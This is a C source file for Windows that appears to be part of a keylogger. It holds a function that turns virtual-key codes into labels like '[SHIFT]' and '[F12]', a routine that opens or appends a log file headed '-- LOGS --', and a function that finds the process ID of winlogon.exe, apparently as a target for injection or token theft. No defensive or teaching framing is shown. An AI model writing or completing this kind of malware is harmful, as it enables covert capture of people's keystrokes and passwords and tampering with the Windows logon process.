#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

char* handleSpecialCase(DWORD vkCode)
{
    switch (vkCode)
    {
        case VK_ESCAPE:
            return "[ESC]";
        case VK_RETURN:
            return "[RETURN]";
        case VK_TAB:
            return "[TAB]";
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL:
            return "[CTRL]";
        case VK_MENU:
        case VK_LMENU:
        case VK_RMENU:
            return "[ALT]";
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:
            return "[SHIFT]";
        case VK_CAPITAL:
            return "[CAPS_LOCK]";
        case VK_BACK:
            return "[BACK]";
                case VK_PAUSE: return "[PAUSE]";
        case VK_KANA: return "[KANA]";
        case VK_IME_ON: return "[IME_ON]";
        case VK_JUNJA: return "[JUNJA]";
        case VK_FINAL: return "[FINAL]";
        case VK_KANJI: return "[KANJI]";
        case VK_IME_OFF: return "[IME_OFF]";
        case VK_CONVERT: return "[CONVERT]";
        case VK_NONCONVERT: return "[NONCONVERT]";
        case VK_ACCEPT: return "[ACCEPT]";
        case VK_MODECHANGE: return "[MODECHANGE]";
        case VK_PRIOR: return "[PRIOR]";
        case VK_NEXT: return "[NEXT]";
        case VK_END: return "[END]";
        case VK_HOME: return "[HOME]";
        case VK_LEFT: return "[LEFT]";
        case VK_UP: return "[UP]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_DOWN: return "[DOWN]";
        case VK_SELECT: return "[SELECT]";
        case VK_PRINT: return "[PRINT]";
        case VK_EXECUTE: return "[EXECUTE]";
        case VK_SNAPSHOT: return "[SNAPSHOT]";
        case VK_INSERT: return "[INSERT]";
        case VK_DELETE: return "[DELETE]";
        case VK_HELP: return "[HELP]";
        case VK_LWIN: return "[LWIN]";
        case VK_RWIN: return "[RWIN]";
        case VK_APPS: return "[APPS]";
        case VK_SLEEP: return "[SLEEP]";
        case VK_NUMPAD0: return "[NUMPAD0]";
        case VK_NUMPAD1: return "[NUMPAD1]";
        case VK_NUMPAD2: return "[NUMPAD2]";
        case VK_NUMPAD3: return "[NUMPAD3]";
        case VK_NUMPAD4: return "[NUMPAD4]";
        case VK_NUMPAD5: return "[NUMPAD5]";
        case VK_NUMPAD6: return "[NUMPAD6]";
        case VK_NUMPAD7: return "[NUMPAD7]";
        case VK_NUMPAD8: return "[NUMPAD8]";
        case VK_NUMPAD9: return "[NUMPAD9]";
        case VK_MULTIPLY: return "[MULTIPLY]";
        case VK_ADD: return "[ADD]";
        case VK_SEPARATOR: return "[SEPARATOR]";
        case VK_SUBTRACT: return "[SUBTRACT]";
        case VK_DECIMAL: return "[DECIMAL]";
        case VK_DIVIDE: return "[DIVIDE]";
        case VK_F1: return "[F1]";
        case VK_F2: return "[F2]";
        case VK_F3: return "[F3]";
        case VK_F4: return "[F4]";
        case VK_F5: return "[F5]";
        case VK_F6: return "[F6]";
        case VK_F7: return "[F7]";
        case VK_F8: return "[F8]";
        case VK_F9: return "[F9]";
        case VK_F10: return "[F10]";
        case VK_F11: return "[F11]";
        case VK_F12: return "[F12]";
        case VK_F13: return "[F13]";
        case VK_F14: return "[F14]";
        case VK_F15: return "[F15]";
        case VK_F16: return "[F16]";
        case VK_F17: return "[F17]";
        case VK_F18: return "[F18]";
        case VK_F19: return "[F19]";
        case VK_F20: return "[F20]";
        case VK_F21: return "[F21]";
        case VK_F22: return "[F22]";
        case VK_F23: return "[F23]";
        case VK_F24: return "[F24]";
    }
    return NULL;
}

int getFolderStringLength (TCHAR* str)
{
    size_t lastBackslashPos = 0;
    for (size_t i = 0; i < strlen(str); i++)
    {
        if (str[i] == '\\')
        {
            lastBackslashPos = i;
        }
    }
    return lastBackslashPos;
}

HANDLE openOrCreateFile(char* filename)
{
	HANDLE hFile;
    // Try to create file
    hFile = CreateFile(filename,      
                       GENERIC_WRITE,        
                       0,                   
                       NULL,               
                       CREATE_NEW,        
                       FILE_ATTRIBUTE_NORMAL,
                       NULL);
    // If creation failed try to edit it
    if (hFile == INVALID_HANDLE_VALUE) 
    { 
        hFile = CreateFile(filename,
                           FILE_APPEND_DATA,
                           0,              
                           NULL,          
                           OPEN_EXISTING,
                           FILE_ATTRIBUTE_NORMAL,
                           NULL);
        if (hFile == INVALID_HANDLE_VALUE)
        {
            printf("[Terminal failure: Unable to creat or open file.\n]");
        }
    }
    else
    {
        char header[] = "-- LOGS --";
        DWORD dwBytesWritten;
        WriteFile( 
            hFile,
            header,
            strlen(header),
            &dwBytesWritten,
            NULL);
    }
    return hFile;
}

DWORD getWinlogonPID(void)
{
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (_stricmp(entry.szExeFile, "winlogon.exe") == 0)
            {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        }
    }

    CloseHandle(snapshot);
    return 0;
}
